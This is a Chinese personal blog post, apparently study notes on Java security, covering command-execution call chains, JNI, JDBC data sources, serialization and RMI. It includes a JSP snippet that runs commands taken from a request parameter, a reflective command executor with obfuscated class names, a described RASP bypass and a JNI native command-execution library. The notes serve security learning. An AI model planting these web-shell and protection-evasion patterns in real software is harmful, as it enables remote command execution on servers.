@@ -1,0 +1,1224 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JAVA安全学习（2） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JAVA安全学习（2） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="本地命令执行
+Runtime命令执行调用链
+Runtime.exec(xxx)调用链如下:
+java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)
+java.lang.Process..." />
+    <meta name="keywords" content="JAVA,学习笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JAVA安全学习（2）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-24
+              </span>
+              <span>
+                32 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-an-quan-xue-xi-2.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="本地命令执行">本地命令执行</h1>
+<h2 id="runtime命令执行调用链">Runtime命令执行调用链</h2>
+<p>Runtime.exec(xxx)调用链如下:</p>
+<pre><code class="language-java">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)
+java.lang.ProcessImpl.start(ProcessImpl.java:134)
+java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
+java.lang.Runtime.exec(Runtime.java:620)
+java.lang.Runtime.exec(Runtime.java:450)
+java.lang.Runtime.exec(Runtime.java:347)
+org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)
+</code></pre>
+<p>执行逻辑大致是：</p>
+<ol>
+<li>Runtime.exec(xxx)</li>
+<li>java.lang.ProcessBuilder.start()</li>
+<li>new java.lang.UNIXProcess(xxx)</li>
+<li>UNIXProcess构造方法中调用了forkAndExec(xxx) native方法。</li>
+<li>forkAndExec调用操作系统级别fork-&gt;exec(*nix)/CreateProcess(Windows)执行命令并返回fork/CreateProcess的PID。</li>
+</ol>
+<p>注意：Runtime和ProcessBuilder并不是程序的最终执行点</p>
+<p><strong>ProcessBuilder执行命令：</strong></p>
+<pre><code class="language-java">    InputStream in = new ProcessBuilder(request.getParameterValues(&quot;cmd&quot;)).start().getInputStream();		// 这一行
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    byte[] b = new byte[1024];
+    int a = -1;
+
+    while ((a = in.read(b)) != -1) {
+        baos.write(b, 0, a);
+    }
+
+    out.write(&quot;&lt;pre&gt;&quot; + new String(baos.toByteArray()) + &quot;&lt;/pre&gt;&quot;);
+</code></pre>
+<h2 id="反射unixprocessprocessimpl执行本地命令">反射UNIXProcess/ProcessImpl执行本地命令</h2>
+<pre><code class="language-java">package exectest;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+
+public class CommandExecutor {
+
+    public static void main(String[] args) throws Exception {
+        if (args.length == 0) {
+            System.err.println(&quot;请提供要执行的命令作为参数&quot;);
+            System.exit(1);
+        }
+
+        InputStream in = start(args);
+        String result = inputStreamToString(in, &quot;UTF-8&quot;);
+        System.out.println(result);
+    }
+
+    public static byte[] toCString(String s) {
+        if (s == null) {
+            return null;
+        }
+
+        byte[] bytes = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0, result, 0, bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
+    }
+
+    public static InputStream start(String[] strs) throws Exception {
+        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});
+        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});
+
+        Class&lt;?&gt; clazz;
+        try {
+            clazz = Class.forName(unixClass);
+        } catch (ClassNotFoundException e) {
+            clazz = Class.forName(processClass);
+        }
+
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        // ... (保持其余的代码不变，将 start 方法的其余部分从你的 JSP 代码复制过来)
+        assert strs != null &amp;&amp; strs.length &gt; 0;
+
+        // Convert arguments to a contiguous block; it's easier to do
+        // memory management in Java than in C.
+        byte[][] args = new byte[strs.length - 1][];
+
+        int size = args.length; // For added NUL bytes
+        for (int i = 0; i &lt; args.length; i++) {
+            args[i] = strs[i + 1].getBytes();
+            size += args[i].length;
+        }
+
+        byte[] argBlock = new byte[size];
+        int    i        = 0;
+
+        for (byte[] arg : args) {
+            System.arraycopy(arg, 0, argBlock, i, arg.length);
+            i += arg.length + 1;
+            // No need to write NUL bytes explicitly
+        }
+
+        int[] envc    = new int[1];
+        int[] std_fds = new int[]{-1, -1, -1};
+
+        FileInputStream  f0 = null;
+        FileOutputStream f1 = null;
+        FileOutputStream f2 = null;
+
+        // In theory, close() can throw IOException
+        // (although it is rather unlikely to happen here)
+        try {
+            if (f0 != null) f0.close();
+        } finally {
+            try {
+                if (f1 != null) f1.close();
+            } finally {
+                if (f2 != null) f2.close();
+            }
+        }
+
+        // 创建UNIXProcess或者ProcessImpl实例
+        Object object = constructor.newInstance(
+                toCString(strs[0]), argBlock, args.length,
+                null, envc[0], null, std_fds, false
+        );
+
+        // 获取命令执行的InputStream
+        Method inMethod = object.getClass().getDeclaredMethod(&quot;getInputStream&quot;);
+        inMethod.setAccessible(true);
+
+        return (InputStream) inMethod.invoke(object);
+    }
+
+    public static String inputStreamToString(InputStream in, String charset) throws IOException {
+        // ... (将 inputStreamToString 方法的代码从你的 JSP 代码复制过来)
+        try {
+            if (charset == null) {
+                charset = &quot;UTF-8&quot;;
+            }
+
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            int                   a   = 0;
+            byte[]                b   = new byte[1024];
+
+            while ((a = in.read(b)) != -1) {
+                out.write(b, 0, a);
+            }
+
+            return new String(out.toByteArray());
+        } catch (IOException e) {
+            throw e;
+        } finally {
+            if (in != null)
+                in.close();
+        }
+    }
+}
+
+</code></pre>
+<h2 id="forkandexec命令执行-unsafe反射native方法调用">forkAndExec命令执行-Unsafe+反射+Native方法调用</h2>
+<p>如果RASP把UNIXProcess/ProcessImpl类的构造方法给拦截了我们是不是就无法执行本地命令了？其实我们可以利用Java的几个特性就可以绕过RASP执行本地命令了，具体步骤如下:</p>
+<ol>
+<li>使用sun.misc.Unsafe.allocateInstance(Class)特性可以无需new或者newInstance创建UNIXProcess/ProcessImpl类对象。</li>
+<li>反射UNIXProcess/ProcessImpl类的forkAndExec方法。</li>
+<li>构造forkAndExec需要的参数并调用。</li>
+<li>反射UNIXProcess/ProcessImpl类的initStreams方法初始化输入输出结果流对象。</li>
+<li>反射UNIXProcess/ProcessImpl类的getInputStream方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
+</ol>
+<h2 id="代办">代办</h2>
+<p>Java可以通过JNI的方式调用动态链接库，我们只需要在动态链接库中写一个本地命令执行的方法就行了。至于如何写JNI动态链接库写我们将在JNI章节中详解。</p>
+<h1 id="jdbc">JDBC</h1>
+<p>Class.forName(CLASS_NAME);会加载并初始化 JDBC 驱动类，那用new 的方式就不会做这一步吗？</p>
+<p><strong>Class.forName(CLASS_NAME);</strong> 和使用 <strong>new</strong> 关键字创建对象是两种不同的操作，它们在加载和初始化类时的行为也是不同的。这里是他们的基本差异：</p>
+<ol>
+<li><strong>Class.forName()</strong>:
+<ul>
+<li>它会加载指定的类。</li>
+<li>它会初始化该类，意味着该类的静态初始化代码块（如果存在）会被执行。</li>
+<li>它不会创建该类的实例。</li>
+</ul>
+</li>
+<li><strong>new ClassName()</strong>:
+<ul>
+<li>如果类还未被加载，它会加载类。</li>
+<li>它会初始化该类（如果该类尚未被初始化），这也意味着静态初始化代码块会被执行。</li>
+<li>它会创建该类的一个新实例，这意味着与实例相关的初始化代码（如构造函数）也会被执行。</li>
+</ul>
+</li>
+</ol>
+<p>所以，如果你这样做：</p>
+<pre><code>javaCopy code
+Driver driver = new com.mysql.jdbc.Driver();
+</code></pre>
+<p>这将加载和初始化 <strong>com.mysql.jdbc.Driver</strong> 类（如果尚未加载/初始化），并创建该类的一个新实例。但是，对于 JDBC 驱动的注册来说，这样做是不够的，因为在大多数情况下，我们并不需要直接使用驱动的实例。通过调用 <strong>Class.forName(CLASS_NAME);</strong>，我们仅仅加载和初始化类，允许其静态代码块注册驱动，而不需要创建不必要的实例。<br>
+总之，两者都可以加载和初始化类，但 <strong>new</strong> 会进一步创建类的实例，而 <strong>Class.forName()</strong> 不会。在 JDBC 驱动的上下文中，我们通常不需要驱动的实例，只需要其静态初始化代码块被执行以注册驱动即可。</p>
+<h2 id="datasource">DataSource</h2>
+<p>在真实的Java项目中通常不会使用原生的JDBC的DriverManager去连接数据库，而是使用数据源(javax.sql.DataSource)来代替DriverManager管理数据库的连接。一般情况下在Web服务启动时候会预先定义好数据源，有了数据源程序就不再需要编写任何数据库连接相关的代码了，<strong>直接引用DataSource对象即可获取数据库连接了</strong>。</p>
+<p>上面的代码不需要手动去配置文件中寻找任何信息就可以直接读取出数据库配置信息甚至是执行SQL语句，其实是利用了Spring的ApplicationContext遍历了当前Web应用中Spring管理的所有的Bean，然后找出所有DataSource的对象，通过反射读取出C3P0、DBCP、Druid这三类数据源的数据库配置信息，最后还利用了DataSource获取了Connection对象实现了数据库查询功能。</p>
+<h3 id="待办数据源注入">待办：数据源注入</h3>
+<p><strong>数据源（DataSource）</strong><br>
+数据源（DataSource）在数据库编程中是一个重要的概念。它主要是一个接口或对象，提供了数据库连接的详细信息和连接池功能。当应用程序需要与数据库进行交互时，它可以从数据源请求一个数据库连接。这样的机制比直接打开和关闭数据库连接更加高效，因为维持一个持久连接是非常消耗资源的。<br>
+在Java中，javax.sql.DataSource 是一个接口，许多数据库连接池（如C3P0、DBCP、Druid）都实现了这个接口，以提供连接池功能。<br>
+<strong>Spring的ApplicationContext</strong><br>
+Spring框架中的 ApplicationContext 是一个高级接口，代表了Spring IoC容器，并为应用程序提供了配置信息。通过 ApplicationContext，你可以访问所有Spring管理的bean（对象）。<br>
+<strong>描述中的流程</strong><br>
+查找Spring数据库配置信息：当Spring应用被启动，它通常会加载一些配置文件，其中包括数据库连接的信息。这些信息通常包括了数据库的URL、用户名和密码。<br>
+遍历Spring管理的所有Bean：通过Spring的 ApplicationContext，可以访问到Spring管理的所有对象，包括数据源。<br>
+找出所有DataSource的对象：从Spring管理的所有bean中，找出那些是数据源的对象。<br>
+通过反射读取数据库配置信息：利用Java的反射机制，可以访问到对象的私有字段和方法。因此，通过反射，可以读取数据源对象中存储的数据库连接信息（如URL、用户名、密码等）。<br>
+利用DataSource获取数据库连接：一旦获得了数据源对象，就可以从中获取数据库连接，然后执行SQL语句。<br>
+<strong>结论</strong><br>
+这段描述强调了一个安全方面的重要概念：如果攻击者能够执行代码或有其他手段访问Spring的 ApplicationContext，那么他们就可能能够访问数据库连接信息，并可能执行任意SQL语句，从而造成严重的安全风险。<br>
+总之，数据源对象是存储数据库连接信息和提供数据库连接的接口或对象。在Spring中，如果不正确地配置或暴露了相关信息，攻击者可能会利用这些对象进行恶意操作。</p>
+<h1 id="urlconnection">URLConnection</h1>
+<p>在java中，Java抽象出来了一个URLConnection类，它用来表示<strong>应用程序以及与URL建立通信连接的所有类的超类</strong>，通过URL类中的openConnection方法获取到URLConnection的类对象。</p>
+<p>由上图可以看到，支持的协议有以下几个(当前jdk版本:1.7.0_80):</p>
+<pre><code>file ftp mailto http https jar netdoc gopher
+</code></pre>
+<p>我们来使用URL发起一个简单的请求</p>
+<pre><code class="language-java">public class URLConnectionDemo {
+
+    public static void main(String[] args) throws IOException {
+        URL url = new URL(&quot;https://www.baidu.com&quot;);
+
+        // 打开和url之间的连接
+        URLConnection connection = url.openConnection();
+
+        // 设置请求参数
+        connection.setRequestProperty(&quot;user-agent&quot;, &quot;javasec&quot;);
+        connection.setConnectTimeout(1000);
+        connection.setReadTimeout(1000);
+        ...
+
+        // 建立实际连接
+        connection.connect();
+
+        // 获取响应头字段信息列表
+        connection.getHeaderFields();
+
+        // 获取URL响应
+        connection.getInputStream();
+
+        StringBuilder response = new StringBuilder();
+        BufferedReader in = new BufferedReader(
+            new InputStreamReader(connection.getInputStream()));
+        String line;
+
+        while ((line = in.readLine()) != null) {
+            response.append(&quot;/n&quot;).append(line);
+        }
+
+        System.out.print(response.toString());
+    }
+}
+</code></pre>
+<p>大概描述一下这个过程，首先使用URL建立一个对象，调用url对象中的openConnection来获取一个URLConnection的实例，然后通过在URLConnection设置各种请求参数以及一些配置，在使用其中的connect方法来发起请求，然后在调用getInputStream来获请求的响应流。 这是一个基本的请求到响应的过程。</p>
+<h1 id="jni安全基础">JNI安全基础</h1>
+<p>需要特别注意的是Java和JNI定义的类型是需要转换的，不能直接使用Java里的类型，也不能直接将JNI、C/C++的类型直接返回给Java。<br>
+参考如下类型对照表:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Java类型</strong></th>
+<th><strong>JNI类型</strong></th>
+<th><strong>C/C++类型</strong></th>
+<th><strong>大小</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Boolean</td>
+<td>Jblloean</td>
+<td>unsigned char</td>
+<td>无符号8位</td>
+</tr>
+<tr>
+<td>Byte</td>
+<td>Jbyte</td>
+<td>char</td>
+<td>有符号8位</td>
+</tr>
+<tr>
+<td>Char</td>
+<td>Jchar</td>
+<td>unsigned short</td>
+<td>无符号16位</td>
+</tr>
+<tr>
+<td>Short</td>
+<td>Jshort</td>
+<td>short</td>
+<td>有符号16位</td>
+</tr>
+<tr>
+<td>Int</td>
+<td>Jint</td>
+<td>int</td>
+<td>有符号32位</td>
+</tr>
+<tr>
+<td>Long</td>
+<td>Jlong</td>
+<td>long long</td>
+<td>有符号64位</td>
+</tr>
+<tr>
+<td>Float</td>
+<td>Jfloat</td>
+<td>float</td>
+<td>32位</td>
+</tr>
+<tr>
+<td>Double</td>
+<td>Jdouble</td>
+<td>double</td>
+<td>64位</td>
+</tr>
+</tbody>
+</table>
+<h2 id="jni命令执行">JNI命令执行</h2>
+<p>编写CommandExecution.java</p>
+<pre><code class="language-java">package jni;
+
+public class CommandExecution {
+    public static native String exec(String cmd);
+}
+</code></pre>
+<p>执行命令：</p>
+<pre><code class="language-java">javac -cp . ./jni/CommandExecution.java
+javah -d jni/ -cp . jni.CommandExecution
+</code></pre>
+<p>生成头文件</p>
+<pre><code class="language-java">/* DO NOT EDIT THIS FILE - it is machine generated */
+#include &quot;jni.h&quot;
+/* Header for class jni_CommandExecution */
+
+#ifndef _Included_jni_CommandExecution
+#define _Included_jni_CommandExecution
+#ifdef __cplusplus
+extern &quot;C&quot; {
+#endif
+/*
+ * Class:     jni_CommandExecution
+ * Method:    exec
+ * Signature: (Ljava/lang/String;)Ljava/lang/String;
+ */
+JNIEXPORT jstring JNICALL Java_jni_CommandExecution_exec
+  (JNIEnv *, jclass, jstring);
+
+#ifdef __cplusplus
+}
+#endif
+#endif
+
+</code></pre>
+<p>使用C/C++编写jni_CommandExecution.cpp</p>
+<pre><code class="language-java">#include &lt;iostream&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;cstring&gt;
+#include &lt;string&gt;
+#include &quot;jni_CommandExecution.h&quot;
+
+using namespace std;
+
+JNIEXPORT jstring
+
+JNICALL Java_com_anbai_sec_cmd_CommandExecution_exec
+        (JNIEnv *env, jclass jclass, jstring str) {
+
+    if (str != NULL) {
+        jboolean jsCopy;
+        // 将jstring参数转成char指针
+        const char *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy);
+
+        // 使用popen函数执行系统命令
+        FILE *fd  = popen(cmd, &quot;r&quot;);
+
+        if (fd != NULL) {
+            // 返回结果字符串
+            string result;
+
+            // 定义字符串数组
+            char buf[128];
+
+            // 读取popen函数的执行结果
+            while (fgets(buf, sizeof(buf), fd) != NULL) {
+                // 拼接读取到的结果到result
+                result +=buf;
+            }
+
+            // 关闭popen
+            pclose(fd);
+
+            // 返回命令执行结果给Java
+            return env-&gt;NewStringUTF(result.c_str());
+        }
+
+    }
+
+    return NULL;
+}
+</code></pre>
+<p>使用g++命令编译成动态链接库：</p>
+<pre><code class="language-java">g++ -fPIC -I&quot;$JAVA_HOME/include&quot; -I&quot;$JAVA_HOME/include/darwin&quot; -shared -o libcmd.jnilib jni_CommandExecution.cpp
+</code></pre>
+<p>编写CommandExecutionTest.java</p>
+<pre><code class="language-java">package jni;
+
+import java.io.File;
+import java.lang.reflect.Method;
+
+public class CommandExecutionTest {
+
+    private static final String COMMAND_CLASS_NAME = &quot;jni.CommandExecution&quot;;
+
+    /**
+     * JDK1.5编译的jni.CommandExecution类字节码,
+     * 只有一个public static native String exec(String cmd);的方法
+     */
+    private static final byte[] COMMAND_CLASS_BYTES = new byte[]{
+            -54, -2, -70, -66, 0, 0, 0, 52, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 20, 106, 110, 105, 47, 67, 111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 1, 9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11
+    };
+
+    public static void main(String[] args) {
+        String cmd = &quot;whoami&quot;;// 定于需要执行的cmd
+
+        try {
+            ClassLoader loader = new ClassLoader(CommandExecutionTest.class.getClassLoader()) {
+                @Override
+                protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+                    try {
+                        return super.findClass(name);
+                    } catch (ClassNotFoundException e) {
+                        return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);
+                    }
+                }
+            };
+
+            // 测试时候换成自己编译好的lib路径
+            File libPath = new File(&quot;/Users/ea5ter/Documents/CTF/code/javaWeb/JWS/src/jni/libcmd.jnilib&quot;);
+
+            // load命令执行类
+            Class commandClass = loader.loadClass(&quot;jni.CommandExecution&quot;);
+
+            // 可以用System.load也加载lib也可以用反射ClassLoader加载,如果loadLibrary0
+            // 也被拦截了可以换java.lang.ClassLoader$NativeLibrary类的load方法。         
+            
+            // Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(&quot;$NativeLibrary.load&quot;, Class.class, File.class);
+            // loadLibrary0Method.setAccessible(true);
+            // loadLibrary0Method.invoke(loader, commandClass, libPath);
+
+            System.load(libPath.getAbsolutePath());
+
+            String content = (String) commandClass.getMethod(&quot;exec&quot;, String.class).invoke(null, cmd);
+            System.out.println(content);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+</code></pre>
+<p>过程自我梳理：<br>
+这个实验的目的是使用JNI来调用一个命令执行的方法，而且JNI调用的方法是我们自己编写的。要实现这个目的，我们做了几个工作。<br>
+1、写了一个CommandExecution.java，它编译之后的类就是之后需要动态加载的。其中声明了一个native方法。<br>
+2、之后就是实现这个native方法，用的是C++。先用命令生成了一个头文件，这个头文件中有前面声明的native方法，然后用了一个cpp文件来实现这个方法。<br>
+3、接下来，用命令生成一个动态库，之后用来加载。<br>
+4、最后在测试的代码中，我们将CommandExecution和动态库都载入内存。当我们执行CommandExecution类实例的exec方法时，由于exec是一个native方法，他就会在内存中寻找C++实现的这个方法，最后调用达到了命令执行的效果。</p>
+<p>GPT补充：</p>
+<ol>
+<li><strong>编写Java类并声明native方法</strong>： 你正确地指出了，首先我们编写了<strong>CommandExecution.java</strong>并在其中声明了一个<strong>native</strong>方法。此时，这个方法在Java中是没有实现的，其实现将在C++代码中完成。</li>
+<li><strong>生成JNI头文件</strong>： 使用<strong>javah</strong>命令，我们为刚才的Java类生成了一个C++的头文件。这个头文件定义了如何在C++中为之前声明的<strong>native</strong>方法提供实现。</li>
+<li><strong>编写C++代码实现native方法</strong>： 接下来，我们编写<strong>jni_CommandExecution.cpp</strong>来为JNI头文件中声明的函数提供实现。这里的C++代码负责真正执行命令并返回结果。</li>
+<li><strong>编译生成动态链接库</strong>： 使用<strong>g++<strong>命令，我们从C++代码编译生成了动态链接库（</strong>.so</strong>、<strong>.dylib</strong> 或 <strong>.dll</strong>，取决于操作系统）。这个库包含了我们在C++中为<strong>native</strong>方法编写的实现。</li>
+<li><strong>在Java中加载类和动态链接库</strong>： 在<strong>CommandExecutionTest</strong>中，你使用了一个特定的类加载器（通过继承<strong>ClassLoader</strong>并重写<strong>findClass</strong>方法）来动态加载<strong>CommandExecution</strong>类的字节码。之后，你使用反射机制调用<strong>loadLibrary0</strong>私有方法来加载动态链接库。这一步使得当Java代码调用<strong>native</strong>方法时，JVM知道去哪里找到这个方法的具体实现。最后，你成功地调用了<strong>CommandExecution</strong>类的<strong>exec</strong>方法，此时JVM会调用之前加载的动态链接库中的对应函数实现，从而实现在Java中执行系统命令的效果。</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1695570035004.png" alt="" loading="lazy"></figure>
+<h1 id="java序列化">Java序列化</h1>
+<h2 id="java-序列化反序列化">Java 序列化/反序列化</h2>
+<p>反序列化创建类实例时使用了<strong>sun.reflect.ReflectionFactory.newConstructorForSerialization</strong>创建了一个反序列化专用的<strong>Constructor(反射构造方法对象)</strong>，使用这个特殊的Constructor可以绕过构造方法创建类实例。</p>
+<pre><code class="language-java">package serializes;
+
+import sun.reflect.ReflectionFactory;
+import java.lang.reflect.Constructor;
+
+public class ReflectionFactoryTest {
+
+    public static void main(String[] args) {
+        try {
+            // 获取sun.reflect.ReflectionFactory对象
+            ReflectionFactory factory = ReflectionFactory.getReflectionFactory();
+
+            // 使用反序列化方式获取DeserializationTest类的构造方法
+            Constructor constructor = factory.newConstructorForSerialization(
+                    DeserializationTest.class, Object.class.getConstructor()
+            );
+
+            // 实例化DeserializationTest对象
+            System.out.println(constructor.newInstance());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+</code></pre>
+<h2 id="objectinputstream-objectoutputstream">ObjectInputStream、ObjectOutputStream</h2>
+<p>核心逻辑其实就是使用ObjectOutputStream类的writeObject方法序列化DeserializationTest类，使用ObjectInputStream类的readObject方法反序列化DeserializationTest类而已。</p>
+<pre><code class="language-java">ObjectOutputStream out = new ObjectOutputStream(baos);
+out.writeObject(t);
+
+// 反序列化输入流数据为DeserializationTest对象
+ObjectInputStream in = new ObjectInputStream(bais);
+DeserializationTest test = (DeserializationTest) in.readObject();
+</code></pre>
+<p>完整实例：</p>
+<pre><code class="language-java">package serializes;
+
+import java.io.*;
+import java.util.Arrays;
+
+public class DeserializationTest implements Serializable {
+
+    private String username;
+
+    private String email;
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    // Setter for email
+    public void setEmail(String email) {
+        this.email = email;
+    }
+
+    public String getUsername() {
+        return this.username;
+    }
+
+    // Getter for email
+    public String getEmail() {
+        return this.email;
+    }
+
+    public static void main(String[] args) {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+
+        try {
+            // 创建DeserializationTest类，并类设置属性值
+            DeserializationTest t = new DeserializationTest();
+            t.setUsername(&quot;yz&quot;);
+            t.setEmail(&quot;admin@javaweb.org&quot;);
+
+            // 创建Java对象序列化输出流对象
+            ObjectOutputStream out = new ObjectOutputStream(baos);
+
+            // 序列化DeserializationTest类
+            out.writeObject(t);
+            out.flush();
+            out.close();
+
+            // 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址
+            System.out.println(&quot;DeserializationTest类序列化后的字节数组:&quot; + Arrays.toString(baos.toByteArray()));
+
+            // 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作
+            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+
+            // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
+            ObjectInputStream in = new ObjectInputStream(bais);
+
+            // 反序列化输入流数据为DeserializationTest对象
+            DeserializationTest test = (DeserializationTest) in.readObject();
+            System.out.println(&quot;用户名:&quot; + test.getUsername() + &quot;,邮箱:&quot; + test.getEmail());
+
+            // 关闭ObjectInputStream输入流
+            in.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+</code></pre>
+<h2 id="javaioexternalizable">java.io.Externalizable</h2>
+<p>java.io.Externalizable和java.io.Serializable几乎一样，只是java.io.Externalizable接口定义了writeExternal和readExternal方法需要序列化和反序列化的类实现，其余的和java.io.Serializable并无差别。</p>
+<p><code>public interface Externalizable extends java.io.Serializable</code>继承于java.io.Serializable</p>
+<pre><code class="language-java">@Override
+    public void writeExternal(ObjectOutput out) throws IOException {
+        out.writeObject(username);
+        out.writeObject(email);
+    }
+
+    @Override
+    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
+        this.username = (String) in.readObject();
+        this.email = (String) in.readObject();
+    }
+</code></pre>
+<h2 id="自定义序列化writeobject和反序列化readobject">自定义序列化(writeObject)和反序列化(readObject)</h2>
+<p>实现了java.io.Serializable接口的类，还可以定义如下方法(反序列化<strong>魔术方法</strong>)，这些方法将会在类序列化或反序列化过程中调用：</p>
+<ol>
+<li><strong>private void writeObject(ObjectOutputStream oos),自定义序列化。</strong></li>
+<li><strong>private void readObject(ObjectInputStream ois)，自定义反序列化。</strong></li>
+<li>private void readObjectNoData()。</li>
+<li>protected Object writeReplace()，写入时替换对象。</li>
+<li>protected Object readResolve()。</li>
+</ol>
+<p>具体的方法名定义在java.io.ObjectStreamClass#ObjectStreamClass(java.lang.Class&lt;?&gt;)，其中方法有详细的声明。</p>
+<h2 id="待办事项">待办事项</h2>
+<p>反序列化漏洞分析</p>
+<h1 id="rmi">RMI</h1>
+<p>RMI(Remote Method Invocation)即Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了<strong>Java程序之间跨JVM</strong>的远程通信。</p>
+<p>架构<br>
+<img src="https://skyblu3519.github.io/post-images/1695570054660.png" alt="" loading="lazy"><br>
+RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下：</p>
+<ol>
+<li>RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。</li>
+<li>Stub会将<strong>Remote对象</strong>传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。</li>
+<li>RemoteCall序列化RMI服务名称、Remote对象。</li>
+<li>RMI客户端的远程引用层传输<strong>RemoteCall序列化后的请求信息</strong>通过Socket连接的方式传输到RMI服务端的远程引用层。</li>
+<li>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)。</li>
+<li>Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。</li>
